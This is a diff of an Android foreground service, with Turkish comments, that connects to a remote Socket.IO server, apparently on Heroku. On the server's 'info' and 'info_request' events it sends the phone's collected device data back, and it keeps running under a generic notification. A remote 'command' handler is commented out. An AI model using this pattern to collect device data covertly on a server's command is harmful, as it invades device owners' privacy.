@@ -1,145 +1,147 @@
 package com.tanriverdi.adstormeterna;
 
-import android.app.Notification;
-import android.app.NotificationChannel;
-import android.app.NotificationManager;
 import android.app.Service;
 import android.content.Intent;
-import android.os.Build;
-import android.os.Handler;
 import android.os.IBinder;
 import android.util.Log;
-import android.widget.Toast;
-
 import androidx.annotation.Nullable;
-import androidx.core.app.NotificationCompat;
 
-import io.socket.client.IO;
+import com.tanriverdi.adstormeterna.periodic.Notification;
+import com.tanriverdi.adstormeterna.periodic.PeriodicToastMessage;
+import com.tanriverdi.adstormeterna.backgroundservice.SocketManager;
+import com.tanriverdi.adstormeterna.deviceinfo.DeviceInfo;
+import com.tanriverdi.adstormeterna.deviceinfo.EventActions;
+
+import org.json.JSONException;
+import org.json.JSONObject;
 import io.socket.client.Socket;
 import io.socket.emitter.Emitter;
 
 public class ForegroundService extends Service {
+    private static final String TAG = "ForegroundService";
 
-    private static final String CHANNEL_ID = "SimpleServiceChannel";
-    private Handler handler;
-    private Runnable runnable;
-    private Socket mSocket;
-    private boolean isConnected = false;
+    private PeriodicToastMessage periodicToastMessage;
+    private SocketManager socketManager;
+    private EventActions eventActions ;
+    private DeviceInfo deviceInfo;
+    private Notification notificationHelper;
 
-    {
-        try {
-            // Socket.IO sunucu adresi belirlenir
-            mSocket = IO.socket("https://pcwa-e079d7711976.herokuapp.com/");
-        } catch (Exception e) {
-            // Socket.IO bağlantısı oluşturulurken bir hata oluşursa burada yakalanır
-            e.printStackTrace();
-        }
-    }
+  //  private ChromeCommand chromeCommand;
+
+
+
+
+
+
 
     @Override
     public void onCreate() {
         super.onCreate();
-
-        // Android O ve üstü sürümlerde bildirim kanalını oluştur
-        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
-            createNotificationChannel();
-        }
-        // Bildirim kanalı ilerleyen safhalarda ping event ile sunucuya mesaj gönderecek şekilde ayarlanacaktır.
-        // Foreground servisi için bir bildirim oluşturuluyor
-        Notification notification = new NotificationCompat.Builder(this, CHANNEL_ID)
-                .setContentTitle("Background Service")
-                .setContentText("Service is running in the background")
-                .setSmallIcon(R.drawable.baseline_accessibility_24) // Küçük simge (ikon)
-                .build();
-
-        // Servis foreground olarak başlatılır
-        startForeground(1, notification);
+        initializeComponets();
+        startForegroundService();
 
 
-        // İlerleyen dönemlerde kaldırılacaktır
-        // Handler ve Runnable ile periyodik işlemler yapılır
-        handler = new Handler();
-        runnable = new Runnable() {
-            @Override
-            public void run() {
-                // Sunucu bağlantısını kontrol eder
-                if (isConnected) {
-                    Toast.makeText(ForegroundService.this, "Connected to server", Toast.LENGTH_SHORT).show();
-                } else {
-                    Toast.makeText(ForegroundService.this, "Not connected to server", Toast.LENGTH_SHORT).show();
-                }
-                handler.postDelayed(this, 5000); // 5 saniye sonra tekrar çalıştır
-            }
-        };
-        handler.post(runnable);
-
-        // Socket.IO bağlantısını başlat
-        if (mSocket != null) {
-            mSocket.connect();
-            mSocket.on(Socket.EVENT_CONNECT, new Emitter.Listener() {
-                @Override
-                public void call(Object... args) {
-                    // Bağlantı başarılı olduğunda tetiklenir
-                    Log.d("Socket", "Connected to server");
-                    isConnected = true;
-                }
-            }).on(Socket.EVENT_DISCONNECT, new Emitter.Listener() {
-                @Override
-                public void call(Object... args) {
-                    // Bağlantı kesildiğinde tetiklenir
-                    Log.d("Socket", "Disconnected from server");
-                    isConnected = false;
-                }
-            }).on("your_event", new Emitter.Listener() {
-                @Override
-                public void call(Object... args) {
-                    // Sunucudan gelen özel veriyi işler
-                    Log.d("Socket", "Received data: " + args[0]);
-                }
-            });
-        }
     }
 
     @Override
     public int onStartCommand(Intent intent, int flags, int startId) {
-        // Servis yeniden başlatıldığında sürekli çalışmasını sağlar
-        return START_STICKY;
+
+        // Servis başlatıldığında çağrılır
+        Socket socket = socketManager.getSocket(); // Socket nesnesini alır
+        if (socket != null ) {
+            socket.connect(); // Socket bağlantısını başlatır
+            setUpSocketListeners(socket); // Socket dinleyicilerini kurar
+        }
+        //socket.connect();
+        return START_STICKY; // Servisin her zaman çalışır durumda kalmasını sağlar
+    }
+
+    private void setUpSocketListeners(Socket socket) {
+        // Socket için olay dinleyicilerini kurar
+        socket.on(Socket.EVENT_CONNECT, args -> {
+            Log.d(TAG,"Connected to server" );
+            periodicToastMessage.setConnected(true);
+        }).on(Socket.EVENT_DISCONNECT, args -> {
+            Log.d(TAG,"Disconnected from server");
+            periodicToastMessage.setConnected(false);
+        }).on("info",args -> {
+            socket.emit("info",deviceInfo.getAllDataAsJSONObject());
+            Log.d(TAG , "veri gonderıldı");
+        }).on("info_request", args -> {
+            // "all_server" olayını dinler ve işleme alır
+            JSONObject data = (JSONObject) args[0];
+            try {
+                JSONObject combinedData = eventActions.handleEvents(data);  // Olayları işler
+                sendToServer("info_request", combinedData); // İşlenmiş verileri sunucuya gönderir
+            }catch (JSONException e){
+                Log.e(TAG , "Error processing events", e);
+            }
+        })/*.on("command" , args -> {
+            JSONObject data = (JSONObject) args[0];
+            JSONObject commandData = chromeCommand.handleEvents(data);
+            sendToServer("command", commandData);
+
+        })*/
+        .on("search", new Emitter.Listener() {
+            @Override
+            public void call(Object... args) {
+
+            }
+        }) ;
+    }
+
+
+    private void sendToServer(String event, JSONObject data) {
+        Socket socket = socketManager.getSocket();
+        if (socket != null){
+            try {
+                socket.emit(event, data);
+            } catch (Exception e) {
+                e.printStackTrace();
+            }
+        }
+
+    }
+
+
+
+
+    private  void startForegroundService(){
+        // Foreground servisi için bildirim oluşturma
+        android.app.Notification notification = notificationHelper.createNotification(
+                "Background Service",
+                "Service is running in the background",
+                R.drawable.images
+        );
+        startForeground(1, notification);    // Servisi foreground modda başlatır
+
+        // Periyodik görevleri başlatır
+        periodicToastMessage.startPeriodicTasks();
+    }
+    private void initializeComponets(){
+        // ForegroundService oluşturulduğunda başlatılacak bileşenler
+        deviceInfo = new DeviceInfo(this); // Cihaz bilgilerini almak için yardımcı sınıf
+        notificationHelper = new Notification(this); // Bildirim oluşturma ve yönetimi için yardımcı sınıf
+        periodicToastMessage = new PeriodicToastMessage(this); // Periyodik Toast mesajlarını yönetir
+        socketManager = new SocketManager(); // Socket bağlantısını yönetir
+        eventActions = new EventActions(deviceInfo); // Olayları işlemek için yardımcı sınıf
+       // chromeCommand = new ChromeCommand(this);
+
+
+
     }
 
     @Override
     public void onDestroy() {
+        // Servis yok edildiğinde çağrılır
         super.onDestroy();
-        // Handler'daki runnable işlemi kaldırılır
-        handler.removeCallbacks(runnable);
-        // Socket.IO bağlantısı kapatılır ve olay dinleyicileri temizlenir
-        if (mSocket != null && mSocket.connected()) {
-            mSocket.disconnect();
-            mSocket.off(); // Olay dinleyicilerini temizle
-        }
+        periodicToastMessage.stopPeriodicTasks();
+        socketManager.disconnect();
     }
 
     @Nullable
     @Override
-    public IBinder onBind(Intent intent) {
-        //Bu kısımı detaylıca araştır
-        // Bu servis için binding işlemi yapılmaz
+    public IBinder onBind(Intent intent) {  // Bu servis bağlanılabilir değildir
         return null;
-    }
-
-    private void createNotificationChannel() {
-        // Android O ve üstü sürümlerde bildirim kanalı oluşturulması gereklidir
-        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
-            NotificationChannel serviceChannel = new NotificationChannel(
-                    CHANNEL_ID,
-                    "Simple Background Service Channel",
-                    NotificationManager.IMPORTANCE_DEFAULT
-            );
-
-            NotificationManager manager = getSystemService(NotificationManager.class);
-            if (manager != null) {
-                // Bildirim kanalı sisteme kaydedilir
-                manager.createNotificationChannel(serviceChannel);
-            }
-        }
     }
 }
